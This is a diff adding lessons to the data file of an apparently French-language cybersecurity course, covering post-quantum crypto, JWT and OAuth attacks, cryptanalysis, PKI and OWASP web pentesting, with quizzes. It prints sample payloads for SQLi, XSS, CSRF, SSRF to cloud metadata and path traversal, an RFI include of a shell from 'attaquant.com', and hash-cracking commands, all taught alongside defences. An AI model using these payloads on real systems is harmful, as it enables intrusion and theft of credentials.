+{titre:"Algorithmes NIST 2024",contenu:"<p><b>ML-KEM (Kyber)</b> : echange de cles. <b>ML-DSA (Dilithium)</b> : signature. <b>SLH-DSA (SPHINCS+)</b> : signature hash-based. <b>FALCON</b> : signature.</p>"},
+{titre:"Hybride",contenu:"<p>En transition : X25519+Kyber (TLS hybride). Si l'un casse, l'autre protege.</p>"},
+{titre:"Harvest now, decrypt later",contenu:"<p>Les attaquants enregistrent aujourd'hui pour dechiffrer demain. D'ou la migration urgente.</p>"}
+],
+why:"Anticiper la fin de RSA/ECC. Les donnees bancaires ont une duree de vie longue.",
+bank:"Anticipation : PFS + algorithmes hybrides. Certains HSM supportent deja Kyber.",
+glo:"<b>PQC</b> : Post-Quantum Cryptography. <b>Kyber</b> : KEM. <b>Dilithium</b> : signature.",
+pr:["openssl list -kem-algorithms (OpenSSL 3.5+)","Tester TLS hybride","Lire les specs NIST"],
+er:"Ne pas attendre 2030 pour migrer.",
+df:"Lire les recommandations ANSSI sur la migration PQC.",
+proj:"Plan de migration PQC pour une banque.",
+q:[{q:"Kyber :",a:["Signature","Echange de cles","Hash","Chiffrement symetrique"],c:1,e:"ML-KEM = KEM (echange)."},{q:"Risque quantique :",a:["Rien","RSA/ECC casses","AES casse","SHA casse"],c:1,e:"Shor casse RSA/ECC."}]},
+
+{id:112,t:"HMAC et integrite",d:30,
+intro:"HMAC (Hash-based Message Authentication Code) prouve l'integrite ET l'authenticite d'un message avec une cle partagee.",
+analogy:"Un sceau avec une cle secrete partagee.",
+sections:[
+{titre:"Principe",contenu:"<p>HMAC = Hash(cle + message + cle). Rapide, sur, utilise dans TLS, JWT, API.</p>"},
+{titre:"Usage",contenu:"<ul><li>Signer des cookies (sessions).</li><li>Webhooks (GitHub, Stripe).</li><li>JWT (HS256).</li><li>TLS record authentication.</li></ul>"},
+{titre:"En Python",contenu:"<p><code>import hmac, hashlib</code> ; <code>hmac.new(key, msg, hashlib.sha256).hexdigest()</code>.</p>"}
+],
+why:"Protege l'integrite des messages API. Vulnerabilite si mal implemente.",
+bank:"Signature des webhooks de paiement, sessions bancaires.",
+glo:"<b>HMAC-SHA256</b> : standard API. <b>Secret</b> : cle partagee.",
+pr:["Python hmac","Comparer avec/sans cle","Verifier un webhook"],
+er:"Utiliser == au lieu de compare_digest = timing attack.",
+df:"Implementer un webhook signe HMAC.",
+proj:"Demo webhook HMAC sur GitHub.",
+q:[{q:"HMAC ajoute :",a:["Chiffrement","Integrite+auth","Confidentialite","Rien"],c:1,e:"Cle partagee + hash."},{q:"Timing attack :",a:["compare==","compare_digest","Rien","md5"],c:1,e:"compare_digest = temps constant."}]},
+
+{id:113,t:"JWT : comprendre et attaquer",d:45,
+intro:"JSON Web Token : format standard pour transporter des claims signes. Base des sessions modernes. Nombreuses vulnerabilites.",
+analogy:"Un badge signe par le serveur, que le client porte.",
+sections:[
+{titre:"Structure",contenu:"<p><code>header.payload.signature</code> en base64url. Header : {alg, typ}. Payload : {sub, exp, role...}. Signature : HMAC ou RSA.</p>"},
+{titre:"Vulnerabilites classiques",contenu:"<ul><li><b>alg:none</b> : JWT non signe accepte.</li><li><b>Confusion HS256/RS256</b> : utiliser la cle publique comme secret HMAC.</li><li><b>kid injection</b> : path traversal via kid.</li><li><b>Weak secret</b> : casser HS256 par brute-force.</li></ul>"},
+{titre:"Defense",contenu:"<p>Verifier l'algorithme en whitelist, cle secrete forte, rotation, courte duree (exp), validation serveur stricte.</p>"}
+],
+why:"JWT = auth moderne. Une faille = prise de compte.",
+bank:"Auth des APIs bancaires. Toute faille = compromission.",
+glo:"<b>claim</b> : donnee dans payload. <b>kid</b> : key id. <b>alg</b> : algorithme.",
+pr:["jwt.io","Decoder un JWT","Tester alg:none","Casser HS256 avec rockyou"],
+er:"Ne jamais faire confiance au payload (modifiable).",
+df:"Cracker un JWT HS256 faible.",
+proj:"Write-up JWT sur GitHub.",
+q:[{q:"JWT :",a:["Chiffre","Signe","Rien","Hash"],c:1,e:"Signature (pas chiffrement)."},{q:"Faille classique :",a:["alg:none","Padding","Reboot","Ping"],c:0,e:"Accepter JWT non signe."}]},
+
+{id:114,t:"OAuth 2.0 et OpenID Connect",d:50,
+intro:"OAuth 2.0 est un protocole d'autorisation (pas d'authentification). OIDC ajoute l'authentification par-dessus.",
+analogy:"Un videur de boite qui verifie votre bracelet (jeton).",
+sections:[
+{titre:"Flux OAuth",contenu:"<p><b>Authorization Code</b> : standard web. <b>Client Credentials</b> : machine-to-machine. <b>Implicit</b> : DEPRECIE. <b>PKCE</b> : obligatoire pour mobile/SPA.</p>"},
+{titre:"Attaques",contenu:"<ul><li><b>Redirect URI abuse</b> : vol du code.</li><li><b>CSRF</b> sur authorize (state manquant).</li><li><b>Token leakage</b> : URL Referer.</li><li><b>Scope escalation</b>.</li></ul>"},
+{titre:"Defense",contenu:"<p>PKCE, state aleatoire, whitelist redirect_uri stricte, tokens courts, rotation refresh.</p>"}
+],
+why:"Auth des apps bancaires modernes. Mauvaise config = vol de compte.",
+bank:"OAuth mal implemente = acces aux comptes clients.",
+glo:"<b>PKCE</b> : Proof Key for Code Exchange. <b>Scope</b> : permissions. <b>State</b> : anti-CSRF.",
+pr:["Lire RFC 6749 + 7636","Tester PKCE","Verifier state"],
+er:"Implicit flow (token dans URL) = risque XSS.",
+df:"Auditer l'OAuth d'une app de test (lab).",
+proj:"Checklist audit OAuth sur GitHub.",
+q:[{q:"OAuth fait :",a:["Auth","Autorisation","Chiffrement","Signature"],c:1,e:"Autorisation (pas auth)."},{q:"Mobile :",a:["PKCE","Implicit","Basic","Rien"],c:0,e:"PKCE obligatoire."}]},
+
+{id:115,t:"Chiffrement des donnees au repos",d:40,
+intro:"Chiffrer les donnees au repos protege en cas de vol disque. Solutions : BitLocker, LUKS, chiffrement applicatif.",
+analogy:"Un coffre-fort dans le placard.",
+sections:[
+{titre:"Solutions",contenu:"<ul><li><b>BitLocker</b> (Windows) : TPM + recovery.</li><li><b>LUKS</b> (Linux) : full disk encryption.</li><li><b>Chiffrement applicatif</b> : au niveau DB/colonne.</li><li><b>HSM</b> : cles en materiel dedie.</li></ul>"},
+{titre:"Modele de menace",contenu:"<p>FDE (Full Disk Encryption) protege contre vol disque MAIS pas si le systeme est allume (RAM attack, cold boot).</p>"},
+{titre:"Conformite",contenu:"<p>PCI-DSS, RGPD, BCEAO exigent le chiffrement des donnees sensibles au repos.</p>"}
+],
+why:"Un disque non chiffre = fuite totale si vole.",
+bank:"Donnees clients, IBAN, transactions : toutes chiffrees au repos.",
+glo:"<b>FDE</b> : full disk. <b>FBE</b> : file based. <b>TPM</b> : puce. <b>HSM</b> : module crypto.",
+pr:["Activer BitLocker sur VM","cryptsetup luksFormat","Verifier montage"],
+er:"Stockage des cles de dechiffrement avec les donnees = chiffrement inutile.",
+df:"Chiffrer un disque LUKS en lab et tester le recovery.",
+proj:"Comparatif FDE vs FBE.",
+q:[{q:"LUKS :",a:["Windows","Linux","Mac","Rien"],c:1,e:"Chiffrement disque Linux."},{q:"Cold boot attack :",a:["Disque","RAM","Reseau","Rien"],c:1,e:"Extraction RAM si systeme allume."}]},
+
+{id:116,t:"Cryptanalyse : casser des chiffrements",d:50,
+intro:"La cryptanalyse etudie les faiblesses des algorithmes. Une grande partie du pentest consiste a casser de la crypto mal utilisee.",
+analogy:"Crochetage de serrures numeriques.",
+sections:[
+{titre:"Attaques classiques",contenu:"<ul><li><b>Brute-force</b> : essayer toutes les cles (impossible sur AES-256).</li><li><b>Dictionary</b> : essayer des MDP courants.</li><li><b>Rainbow tables</b> : tables precalculees (contrees par salt).</li><li><b>Frequency analysis</b> : sur les vieux chiffrements.</li><li><b>Padding oracle</b> : erreur de padding.</li><li><b>Bleichenbacher</b> : RSA padding.</li></ul>"},
+{titre:"Outils",contenu:"<p><b>hashcat</b>, <b>john</b> : casser des hash. <b>CyberChef</b> : manipulation. <b>Cryptool</b> : pedagogie.</p>"},
+{titre:"En pratique",contenu:"<p>Chercher les algorithmes obsoletes (MD5, SHA-1, DES, RC4), les IV reutilises, les cles faibles, les mauvaises implementations.</p>"}
+],
+why:"Comprendre l'attaque = mieux defendre. Les erreurs de crypto sont frequentes.",
+bank:"Audit crypto obligatoire (PCI-DSS). Chercher MD5, SHA-1, cles dures dans le code.",
+glo:"<b>Oracle</b> : signal qui aide l'attaquant. <b>Collision</b> : 2 inputs = meme hash.",
+pr:["hashcat -m 0 (MD5)","hashcat -m 1000 (NTLM)","john --format=raw-md5"],
+er:"Ne pas utiliser de GPU = temps enorme.",
+df:"Casser 3 hash MD5 avec rockyou.",
+proj:"Write-up cryptanalyse sur GitHub.",
+q:[{q:"Rainbow table :",a:["Chiffre","Table precalculee","Signature","Hash"],c:1,e:"Contournee par salt."},{q:"Padding oracle :",a:["Erreur padding","Chiffrement","Signature","Rien"],c:0,e:"Exploite erreurs de padding."}]},
+
+{id:117,t:"PKI bancaire et HSM",d:45,
+intro:"Les banques utilisent des HSM (Hardware Security Modules) pour proteger les cles critiques. Le PKI bancaire est tres reglemente.",
+analogy:"Un coffre-fort materiel blinde pour les cles.",
+sections:[
+{titre:"HSM",contenu:"<p>Boitier materiel qui genere, stocke et utilise des cles sans les exposer. Certifie FIPS 140-2/3. Utilise pour PIN codes, signatures, TLS bancaire.</p>"},
+{titre:"PKI bancaire",contenu:"<p>Certificate Authorities internes, chaines de confiance strictes, HSM pour les root CAs. Rotation reguliere. Audits.</p>"},
+{titre:"Conformite",contenu:"<p>PCI PIN, PCI 3DS, exigences BCEAO. HSM certifies obligatoires pour le traitement des PIN.</p>"}
+],
+why:"La cle privee d'une banque = controle total des signatures. HSM la protege physiquement.",
+bank:"HSM = obligatoire pour les transactions de paiement, 3DS, ATM.",
+glo:"<b>FIPS 140-3</b> : certification HSM. <b>3DS</b> : 3D Secure. <b>PIN block</b> : PIN chiffre.",
+pr:["Lire doc Thales Luna","Simuler crypto avec SoftHSM","Comprendre PKCS#11"],
+er:"Sortir la cle du HSM = compromission.",
+df:"Etude de cas : Thales Luna HSM pour une banque.",
+proj:"Note sur HSM et PKI bancaire.",
+q:[{q:"HSM :",a:["Logiciel","Materiel","Reseau","Rien"],c:1,e:"Materiel securise."},{q:"FIPS :",a:["Certification","Algorithme","Protocole","Rien"],c:0,e:"Standard securite US."}]},
+
+{id:118,t:"Crypto dans le code : erreurs frequentes",d:40,
+intro:"La plupart des failles crypto viennent d'une mauvaise utilisation, pas de l'algorithme.",
+analogy:"Un bon cadenas mal installe ne protege rien.",
+sections:[
+{titre:"Top erreurs",contenu:"<ul><li><b>Cles dures</b> dans le code.</li><li><b>IV reutilise</b> en mode CBC/CTR.</li><li><b>Random non sur</b> : Math.random(), rand().</li><li><b>Comparaison non constant-time</b> (==).</li><li><b>MD5/SHA-1</b> pour MDP.</li><li><b>ECB mode</b> (motifs visibles).</li><li><b>Padding oracle</b> (ignorer erreurs).</li></ul>"},
+{titre:"Bonnes pratiques",contenu:"<ul><li>Bibliotheques audit : libsodium, cryptography (Python), BoringSSL.</li><li>Secrets manager (Vault, AWS KMS, Azure Key Vault).</li><li>secrets.token_bytes en Python (crypto-sur).</li><li>hmac.compare_digest pour comparer.</li></ul>"},
+{titre:"Detection",contenu:"<p>Chercher des cles en dur, MD5, ECB, Math.random. Outils SAST (Semgrep, SonarQube, Bandit).</p>"}
+],
+why:"Une erreur crypto dans une app = compromission totale. Tres courant en audit.",
+bank:"Audit code des applications bancaires. PCI-DSS impose bibliotheques fortes.",
+glo:"<b>SAST</b> : analyse statique. <b>Secret scanning</b> : detection de cles.",
+pr:["Rechercher MD5 dans un repo","Chercher cles dures","Bandit sur projet Python","Semgrep"],
+er:"Ne jamais rouler sa propre crypto.",
+df:"Auditer un projet Python avec Bandit + Semgrep.",
+proj:"Rapport d'audit crypto d'un projet open source.",
+q:[{q:"Random sur :",a:["random","Math.random","secrets","rand"],c:2,e:"Python secrets = crypto-sur."},{q:"Comparer MDP :",a:["==","compare_digest","in","Rien"],c:1,e:"Temps constant."}]},
+
+{id:119,t:"Quantum et migration bancaire",d:45,
+intro:"Les banques doivent anticiper la migration post-quantique. Les donnees ont une duree de vie longue (>10 ans).",
+analogy:"Refaire les fondations avant que la maison ne s'effondre.",
+sections:[
+{titre:"Calendrier",contenu:"<p>NIST : standards PQC 2024. ANSSI : migration 2025-2030. Certains experts prevoient un ordinateur quantique cryptographiquement utile vers 2030-2035.</p>"},
+{titre:"Strategies",contenu:"<ul><li><b>Crypto agility</b> : architecture qui permet de changer d'algo.</li><li><b>Hybride</b> : classique + PQC en parallele.</li><li><b>Inventaire</b> : ou est utilisee la crypto ?</li></ul>"},
+{titre:"Conformite",contenu:"<p>BCEAO et regulateurs europeens exigent des plans de migration. Audits.</p>"}
+],
+why:"La securite des donnees a long terme depend de la migration.",
+bank:"Strategique : un plan PQC est maintenant obligatoire dans les grandes banques.",
+glo:"<b>PQC</b> : post-quantique. <b>Hybride</b> : classique + PQC. <b>Crypto agility</b> : souplesse.",
+pr:["Inventaire crypto interne","Lire ANSSI PQC","Tester TLS hybride"],
+er:"Attendre 2030 = trop tard.",
+df:"Rediger un plan de migration PQC pour une banque.",
+proj:"Plan PQC sur GitHub.",
+q:[{q:"Hybride :",a:["1 seul algo","Classique+PQC","Rien","Chiffrement"],c:1,e:"Si l'un casse, l'autre protege."},{q:"Crypto agility :",a:["Souplesse","Rapidite","Chiffrement","Rien"],c:0,e:"Changer d'algo facilement."}]},
+
+{id:120,t:"Projet : PKI interne",d:180,
+intro:"Construire une PKI interne : Root CA + Intermediate + certificats serveurs.",
+analogy:"Creer sa propre autorite de certification.",
+sections:[
+{titre:"Architecture",contenu:"<p>Root CA (offline) → Intermediate CA (online) → Certificats serveurs/clients. CRL/OCSP pour revocation.</p>"},
+{titre:"Etapes",contenu:"<ol><li>openssl genrsa root.key 4096.</li><li>openssl req -x509 -new -key root.key -out root.crt.</li><li>Creer Intermediate CA.</li><li>Signer un certificat serveur avec l'Intermediate.</li><li>Configurer nginx avec le cert + chaine.</li></ol>"},
+{titre:"Tests",contenu:"<p>curl --cacert root.crt https://serveur. Verifier la chaine dans le navigateur.</p>"}
+],
+why:"Comprendre PKI en profondeur = auditer correctement les PKI existantes.",
+bank:"Simuler une PKI bancaire interne.",
+glo:"<b>Root CA</b> : autorite racine. <b>Chain</b> : chaine de confiance.",
+pr:["Root CA","Intermediate","Cert serveur","nginx","curl --cacert"],
+er:"Root CA en ligne = risque majeur.",
+df:"PKI fonctionnelle avec 3 niveaux.",
+proj:"Script de PKI automatisee sur GitHub.",
+q:[{q:"Root CA doit etre :",a:["En ligne","Offline","Publique","Rien"],c:1,e:"Offline pour securite."},{q:"Revocation :",a:["CRL/OCSP","Rien","Renew","Reboot"],c:0,e:"CRL et OCSP."}]},
+
+/* ---------- MODULE 7 : WEB PENTEST & OWASP (121-140) ---------- */
+{id:121,t:"OWASP Top 10 : vue d'ensemble",d:40,
+intro:"L'OWASP Top 10 liste les 10 vulnerabilites web les plus critiques. Reference mondiale pour les pentests.",
+analogy:"Le top 10 des maladies web les plus dangereuses.",
+sections:[
+{titre:"OWASP 2021",contenu:"<ol><li>Broken Access Control</li><li>Cryptographic Failures</li><li>Injection (SQLi, XSS...)</li><li>Insecure Design</li><li>Security Misconfiguration</li><li>Vulnerable Components</li><li>Auth Failures</li><li>Data Integrity Failures</li><li>Logging Failures</li><li>SSRF</li></ol>",svg:"OWASP"},
+{titre:"Pourquoi c'est utile",contenu:"<p>Standard universel pour les pentests, les developpeurs et les audits. Conformite PCI-DSS s'appuie dessus.</p>"}
+],
+why:"Base de tout audit web. Connaissance obligatoire.",
+bank:"Les portails bancaires web sont audites selon OWASP.",
+glo:"<b>XSS</b> : Cross-Site Scripting. <b>SQLi</b> : SQL Injection. <b>SSRF</b> : Server-Side Request Forgery.",
+pr:["Lire owasp.org/Top10","Tester owasp.org","Identifier categories"],
+er:"Ne pas tester chaque categorie = audit incomplet.",
+df:"Faire un audit OWASP d'une app lab (DVWA).",
+proj:"Rapport OWASP Top 10 d'un lab.",
+q:[{q:"Top 1 OWASP 2021 :",a:["SQLi","Broken Access Control","XSS","CSRF"],c:1,e:"Access Control = #1."},{q:"SSRF :",a:["Injection","Requete serveur","Auth","Crypto"],c:1,e:"Server-Side Request Forgery."}]},
+
+{id:122,t:"Injection SQL (SQLi)",d:50,
+intro:"Une injection SQL permet d'executer du SQL arbitraire via une entree mal filtree. Critique : acces a toute la base.",
+analogy:"Faire dire au serveur autre chose que ce que vous demandez.",
+sections:[
+{titre:"Types",contenu:"<ul><li><b>In-band</b> : UNION-based, error-based.</li><li><b>Blind</b> : boolean, time-based.</li><li><b>Out-of-band</b> : DNS exfiltration.</li></ul>"},
+{titre:"Detection",contenu:"<p>Injecter <code>'</code>, <code>' OR 1=1 --</code>, <code>' UNION SELECT</code>. Outils : sqlmap, Burp.</p>"},
+{titre:"Defense",contenu:"<p>Requetes preparees (parametrized queries). Valider entrees. Comptes DB a privileges minimaux. WAF (protection partielle).</p>"}
+],
+why:"SQLi = faille historique la plus exploitee. Acces base complete.",
+bank:"Vol de donnees clients. Amende RGPD/BCEAO.",
+glo:"<b>Union</b> : concatenation. <b>Blind</b> : pas de retour direct. <b>WAF</b> : pare-feu web.",
+pr:["DVWA SQLi low","sqlmap -u URL","Tester payloads","Tester defense prepared"],
+er:"Blacklist ' ne suffit pas. Utilisez des requetes preparees.",
+df:"Exploiter DVWA SQLi et proposer un correctif.",
+proj:"Write-up SQLi sur GitHub.",
+q:[{q:"Defense principale :",a:["WAF","Prepared statements","Blacklist","Rien"],c:1,e:"Requetes preparees = defense de fond."},{q:"' OR 1=1 -- :",a:["XSS","SQLi","CSRF","SSRF"],c:1,e:"Contourne la condition."}]},
+
+{id:123,t:"Cross-Site Scripting (XSS)",d:45,
+intro:"XSS injecte du JavaScript malveillant qui s'execute dans le navigateur de la victime.",
+analogy:"Faire dire au site : 'Execute ce code pour moi'.",
+sections:[
+{titre:"Types",contenu:"<ul><li><b>Reflected</b> : payload dans l'URL, immediat.</li><li><b>Stored</b> : stocke en DB, se declenche pour chaque visiteur.</li><li><b>DOM-based</b> : dans le JS client-side.</li></ul>"},
+{titre:"Payloads",contenu:"<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, <code>\"><img src=x onerror=alert(1)></code>, <code>javascript:alert(1)</code>.</p>"},
+{titre:"Defense",contenu:"<p>Echapper les sorties (HTML encode). CSP (Content Security Policy). Cookies HttpOnly. Frameworks modernes (React, Vue) echappent par defaut.</p>"}
+],
+why:"XSS permet vol de session, phishing, defacement. Cible des apps bancaires.",
+bank:"Vol de session bancaire = prise de compte. CSP obligatoire sur les portails.",
+glo:"<b>CSP</b> : Content Security Policy. <b>HttpOnly</b> : cookie inaccessible au JS.",
+pr:["DVWA XSS low","Tester payloads","Tester CSP","Cookies HttpOnly"],
+er:"Blacklist <script> = contournable.",
+df:"Exploiter DVWA XSS et proposer correctif CSP.",
+proj:"Write-up XSS avec payloads.",
+q:[{q:"XSS vole :",a:["Mot de passe DB","Session cookie","Fichier","Rien"],c:1,e:"Cookie de session = takeover."},{q:"HttpOnly :",a:["Cookie protege","Chiffrement","Hash","Rien"],c:0,e:"Cookie inaccessible au JS."}]},
+
+{id:124,t:"CSRF",d:35,
+intro:"CSRF (Cross-Site Request Forgery) force l'utilisateur authentifie a faire une action non desiree.",
+analogy:"Un papier signe par la victime, mais que l'attaquant a prepare.",
+sections:[
+{titre:"Principe",contenu:"<p>Victime connectee a sa banque. Attaquant sur un autre site : <code>&lt;img src=\"https://banque.com/transfer?amount=1000&to=attaquant\"&gt;</code>. Le navigateur envoie les cookies automatiquement.</p>"},
+{titre:"Defense",contenu:"<ul><li>Token CSRF aleatoire dans chaque formulaire.</li><li>Cookies SameSite=Lax/Strict.</li><li>Verifier Origin/Referer.</li><li>Re-authentification pour actions sensibles.</li></ul>"}
+],
+why:"CSRF sur une banque = virement non autorise.",
+bank:"Token CSRF + SameSite = obligatoires sur les virements.",
+glo:"<b>SameSite</b> : attribut cookie. <b>Token CSRF</b> : anti-CSRF.",
+pr:["DVWA CSRF","Construire payload","Tester sans token","Tester avec SameSite"],
+er:"Compter uniquement sur Referer = contournable.",
+df:"Construire une CSRF de virement (lab) et proposer defense.",
+proj:"Write-up CSRF sur GitHub.",
+q:[{q:"CSRF :",a:["Execute JS","Force action","Injecte SQL","Rien"],c:1,e:"Action forcee via cookies."},{q:"Defense :",a:["SameSite","Blacklist","WAF seul","Rien"],c:0,e:"SameSite + token."}]},
+
+{id:125,t:"Broken Access Control (IDOR)",d:40,
+intro:"IDOR (Insecure Direct Object Reference) : acceder a des ressources d'autres utilisateurs en changeant un identifiant.",
+analogy:"Changer le numero de chambre a l'hotel et entrer.",
+sections:[
+{titre:"Exemple",contenu:"<p><code>GET /api/user/123</code> renvoie vos infos. <code>GET /api/user/124</code> renvoie celles d'un autre. Pas de verification cote serveur.</p>"},
+{titre:"Autres cas",contenu:"<ul><li>Vertical : user normal accede a admin.</li><li>Horizontal : user A accede a user B.</li><li>Force browsing : /admin sans verif.</li></ul>"},
+{titre:"Defense",contenu:"<p>Verifier systematiquement les permissions serveur. UUID au lieu d'ID sequentiels. Tests automatises.</p>"}
+],
+why:"Numero 1 OWASP 2021. Frequent dans les APIs.",
+bank:"Acces aux comptes d'autres clients = fuite massive.",
+glo:"<b>IDOR</b> : acces direct a objet. <b>UUID</b> : identifiant non sequentiel.",
+pr:["Changer un ID dans URL","Tester /api/user/X","Burp Intruder","Comparer reponses"],
+er:"Cacher l'ID dans JS = securite par obscurite.",
+df:"Exploiter un IDOR sur lab (PortSwigger).",
+proj:"Write-up IDOR sur GitHub.",
+q:[{q:"IDOR :",a:["Injection","Acces objet direct","XSS","CSRF"],c:1,e:"Acces sans verif."},{q:"Defense :",a:["UUID","WAF","Rien","Blacklist"],c:0,e:"UUID + verif serveur."}]},
+
+{id:126,t:"SSRF",d:40,
+intro:"SSRF (Server-Side Request Forgery) force le serveur a faire une requete vers une ressource interne.",
+analogy:"Se servir du serveur comme proxy pour atteindre l'interne.",
+sections:[
+{titre:"Impact",contenu:"<p>Acces a des services internes (metadata cloud 169.254.169.254, Redis, MongoDB), contournement firewall, port scanning interne.</p>"},
+{titre:"Exemple",contenu:"<p><code>POST /fetch</code> avec <code>url=http://169.254.169.254/latest/meta-data/</code> renvoie les credentials AWS.</p>"},
+{titre:"Defense",contenu:"<p>Whitelist domaines. Bloquer IP privees (10., 127., 169.254.). Resolver DNS securise. Pas de suivi de redirect.</p>"}
+],
+why:"SSRF = acces reseau interne depuis l'exterieur. Critique en cloud.",
+bank:"SSRF sur une API bancaire = acces a des services internes sensibles.",
+glo:"<b>SSRF</b> : requete serveur. <b>Metadata cloud</b> : 169.254.169.254.",
+pr:["PortSwigger SSRF lab","Tester 127.0.0.1","Tester 169.254.169.254","Bypass whitelist avec DNS rebinding"],
+er:"Bloquer juste 'localhost' = contournable (127.0.0.1, [::1], 0.0.0.0).",
+df:"Exploiter SSRF sur lab et proposer defense.",
+proj:"Write-up SSRF sur GitHub.",
+q:[{q:"SSRF cible :",a:["Client","Serveur","Rien","Base"],c:1,e:"Requete cote serveur."},{q:"IP metadata :",a:["127.0.0.1","169.254.169.254","8.8.8.8","Rien"],c:1,e:"Metadata cloud."}]},
+
+{id:127,t:"Burp Suite : maitrise",d:55,
+intro:"Burp Suite est l'outil de reference pour tester les applications web. Proxy, repeater, intruder, scanner.",
+analogy:"Un microscope pour observer et modifier le trafic web.",
+sections:[
+{titre:"Modules",contenu:"<ul><li><b>Proxy</b> : intercepte les requetes.</li><li><b>Repeater</b> : rejouer/modifier.</li><li><b>Intruder</b> : brute-force/fuzzing.</li><li><b>Scanner</b> (Pro) : automatique.</li><li><b>Decoder</b> : encodage.</li><li><b>Comparer</b> : diff reponses.</li></ul>"},
+{titre:"Workflow",contenu:"<ol><li>Configurer proxy navigateur.</li><li>Naviguer sur l'app cible.</li><li>Envoyer requetes interessantes au Repeater.</li><li>Modifier et observer.</li><li>Intruder pour payloads multiples.</li></ol>"},
+{titre:"Alternatives",contenu:"<p>OWASP ZAP (libre), Caido (moderne), mitmproxy (scripting Python).</p>"}
+],
+why:"Burp = standard des pentests web.",
+bank:"Audit des portails bancaires obligatoire avec Burp/ZAP.",
+glo:"<b>Intercept</b> : bloquer une requete. <b>Scope</b> : perimetre.",
+pr:["Installer Burp","Configurer proxy","Intercepter traffic","Repeater","Intruder"],
+er:"Ne pas limiter le scope = requetes sur des sites non autorises.",
+df:"Intercepter et modifier une requete de login sur DVWA.",
+proj:"Cheatsheet Burp sur GitHub.",
+q:[{q:"Intruder :",a:["Rejouer 1","Fuzzer payloads","Proxy","Rien"],c:1,e:"Fuzzing/brute-force."},{q:"Alternative libre :",a:["ZAP","Chrome","Nmap","Rien"],c:0,e:"OWASP ZAP."}]},
+
+{id:128,t:"Fuzzing web",d:40,
+intro:"Le fuzzing envoie des entrees aleatoires pour declencher des erreurs ou comportements anormaux.",
+analogy:"Secouer le systeme pour voir ce qui tombe.",
+sections:[
+{titre:"Outils",contenu:"<ul><li><b>ffuf</b> : fuzzing rapide (URL, headers, params).</li><li><b>wfuzz</b> : alternative Python.</li><li><b>Intruder Burp</b> : GUI.</li><li><b>SecLists</b> : wordlists.</li></ul>"},
+{titre:"Cibles frequentes",contenu:"<p>Repertoires (/admin, /backup), parametres, subdomains, vhosts, cookies.</p>"},
+{titre:"Exemple ffuf",contenu:"<p><code>ffuf -u https://site/FUZZ -w wordlist.txt -mc 200,301</code>.</p>"}
+],
+why:"Decouvre des ressources cachees. Base du pentest web.",
+bank:"Chercher des endpoints d'admin oublies sur les portails bancaires.",
+glo:"<b>Wordlist</b> : liste de mots. <b>Status</b> : code HTTP.",
+pr:["ffuf sur lab","SecLists","Filtrer status 200","Filtrer taille"],
+er:"Fuzzer sans limite = DoS accidentel.",
+df:"Decouvrir 3 repertoires caches sur lab avec ffuf.",
+proj:"Cheatsheet fuzzing sur GitHub.",
+q:[{q:"ffuf :",a:["Fuzzer","Scanner","Proxy","Rien"],c:0,e:"Fuzzer rapide."},{q:"SecLists :",a:["Wordlists","Scanner","Proxy","Rien"],c:0,e:"Collection wordlists."}]},
+
+{id:129,t:"Subdomain enumeration",d:35,
+intro:"Decouvrir les sous-domaines d'une cible : dev.site.com, admin.site.com, ancien.site.com...",
+analogy:"Chercher toutes les portes de la maison, pas seulement l'entree.",
+sections:[
+{titre:"Methodes",contenu:"<ul><li><b>Bruteforce</b> : ffuf, gobuster.</li><li><b>OSINT</b> : crt.sh (certificats), dnsdumpster.</li><li><b>Certificats TLS</b> : SAN dans les certs.</li><li><b>DNS zone transfer</b> : rare mais critique.</li></ul>"},
+{titre:"Exemple",contenu:"<p><code>ffuf -u https://FUZZ.site.com -w subdomains.txt</code>. Ou consulter crt.sh?q=%25.site.com.</p>"}
+],
+why:"Les sous-domaines oublies = cibles faibles. Souvent non patchees.",
+bank:"Un dev.banque.com oublie = porte d'entree.",
+glo:"<b>crt.sh</b> : base certificats. <b>AXFR</b> : transfert de zone.",
+pr:["crt.sh sur site cible","ffuf bruteforce","dnsdumpster","Verifier scope"],
+er:"Ne scanner que les domaines autorises (scope pentest).",
+df:"Enum 3 sous-domaines sur un domaine public (dans le scope).",
+proj:"Rapport enum subdomains sur lab.",
+q:[{q:"crt.sh :",a:["Certificats","DNS","Ports","Rien"],c:0,e:"Base de certificats publics."},{q:"Zone transfer :",a:["AXFR","A","AAAA","Rien"],c:0,e:"Rare mais critique."}]},
+
+{id:130,t:"Directory traversal",d:35,
+intro:"Le directory traversal (path traversal) permet d'acceder a des fichiers hors du repertoire web via <code>../</code>.",
+analogy:"Sortir de la piece par la fenetre.",
+sections:[
+{titre:"Exemple",contenu:"<p><code>GET /download?file=../../../etc/passwd</code> renvoie le fichier sensible.</p>"},
+{titre:"Defense",contenu:"<p>Valider le path (realpath), whitelist de fichiers, chroot, pas de concatenation directe.</p>"},
+{titre:"Variantes",contenu:"<p>Encodage URL (%2e%2e%2f), UTF-8 overlong, double encodage, null byte (%00).</p>"}
+],
+why:"Lecture de fichiers sensibles (config, cles, /etc/passwd).",
+bank:"Acces a des fichiers de config avec credentials bancaires.",
+glo:"<b>Traversal</b> : sortir du repertoire. <b>LFI</b> : Local File Inclusion.",
+pr:["DVWA Traversal","Tester ../etc/passwd","Tester encodages","Tester whitelist"],
+er:"Filtrer '../' seul = contournable.",
+df:"Exploiter traversal sur DVWA + proposer fix.",
+proj:"Write-up traversal sur GitHub.",
+q:[{q:"Traversal :",a:["../","--","&","Rien"],c:0,e:"Acces hors repertoire."},{q:"Defense :",a:["realpath","Blacklist","WAF","Rien"],c:0,e:"Validation path."}]},
+
+{id:131,t:"LFI / RFI",d:40,
+intro:"Local File Inclusion (LFI) inclut un fichier local dans l'execution. Remote File Inclusion (RFI) inclut un fichier distant.",
+analogy:"Faire lire au serveur un fichier que vous choisissez.",
+sections:[
+{titre:"LFI",contenu:"<p><code>?page=../../etc/passwd</code>. Peut aussi inclure des logs (log poisoning) pour RCE.</p>"},
+{titre:"RFI",contenu:"<p><code>?page=http://attaquant.com/shell.php</code> si allow_url_include=On (rare).</p>"},
+{titre:"Defense",contenu:"<p>Whitelist de pages. Pas d'inclusion dynamique de chemins utilisateur. disable allow_url_include.</p>"}
+],
+why:"LFI + log poisoning = RCE. Critique.",
+bank:"LFI sur portail bancaire = RCE potentielle.",
+glo:"<b>LFI</b> : local. <b>RFI</b> : remote. <b>Log poisoning</b> : injecter dans les logs.",
+pr:["DVWA LFI","Tester /etc/passwd","Log poisoning","php://filter"],
+er:"LFI + upload = RCE.",
